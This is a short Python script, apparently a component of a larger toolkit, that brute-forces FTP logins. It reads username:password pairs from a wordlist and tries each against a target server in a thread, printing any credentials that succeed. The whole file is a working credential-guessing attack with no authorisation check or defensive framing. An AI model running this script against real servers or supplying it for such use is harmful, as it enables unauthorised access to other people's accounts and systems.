# Python Script for FTP Brute Force

# Importing modules
import ftplib
import os
import threading
from colorama import init, Fore

init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE


class FTPBrute(threading.Thread):
    def __init__(self, target):
        threading.Thread.__init__(self)
        self.target = target
        self.port = 21

    def ftp_brute(self, hostname, username, password):
        # Initializing FTP client
        client = ftplib.FTP()

        try:
            # Connecting to FTP server
            client.connect(hostname, self.port, timeout=5)
            # Login using the credentials
            client.login(username, password)
        except ftplib.error_perm:
            # Incorrect credentials
            # print(f"\n[FTP] Invalid credentials for {username}:{password}")
            pass
        else:
            # Connection has been established
            print(
                f"{GREEN}\n[FTP] Found credentials:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
            return True

    def run(self):
        # Read the file
        parent_dir = os.getcwd()
        wordlist_path = os.path.join(parent_dir, "data", "wordlists", "ftp_wordlist.txt")
        cred_list = open(wordlist_path).read().splitlines()

        # Start the brute force
        for cred in cred_list:
            username = cred.split(':')[0]
            password = cred.split(':')[1]

            if self.ftp_brute(self.target, username, password):
                break
